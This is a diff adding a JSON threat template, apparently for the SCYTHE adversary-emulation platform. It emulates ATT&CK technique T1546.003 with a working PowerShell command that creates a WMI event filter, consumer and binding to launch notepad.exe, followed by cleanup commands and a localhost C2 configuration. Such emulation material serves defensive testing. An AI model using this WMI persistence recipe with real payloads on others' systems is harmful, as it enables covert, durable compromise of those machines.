@@ -1,0 +1,77 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "T1546.003 - Windows Management Instrumentation Event Subscription",
+        "display_name": "T1546_003-WMI_Event_Subscription",
+        "name": "T1546_003-WMI_Event_Subscription",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":10}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "PERSISTENCE"
+            },
+            "2": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "3": {
+                "function": "ifelse",
+                "next": "9",
+                "step": "2",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"$FilterArgs = @{name='SCYTHE-WMIPersistence-Example'; EventNameSpace='root\\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325'};$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='SCYTHE-WMIPersistence-Example'; CommandLineTemplate='$($Env:SystemRoot)\\System32\\notepad.exe';};$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{Filter = [Ref] $Filter;Consumer = [Ref] $Consumer;};$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\"",
+                "rtags": [
+                    "att&ck-technique:T1546.003"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "time": "60",
+                "type": "delay"
+            },
+            "7": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "8": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter 'Name = ''SCYTHE-WMIPersistence-Example'''; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter 'Name = ''SCYTHE-WMIPersistence-Example'''; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject\"",
+                "type": "message"
+            },
+            "9": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
